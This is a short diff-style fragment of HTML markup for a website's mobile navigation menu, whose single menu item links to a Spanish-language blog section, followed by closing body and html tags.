+<div class="mobmenu-left-alignment mobmenu-panel mobmenu-left-panel  "> <a href="#" class="mobmenu-left-bt" aria-label="Left Menu Button"><i class="mob-icon-cancel-1 mob-cancel-button"></i></a><div class="mobmenu-content"><div class="menu-menu-espanol-container"><ul id="mobmenuleft" role="menubar" aria-label="Main navigation for mobile devices"><li role="none" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1304"><a href="/es" role="menuitem" class="">BLOG EN ESPAÑOL</a></li></ul></div></div>
+<div class="mob-menu-left-bg-holder"></div>
+</div>
+</body>
+</html>
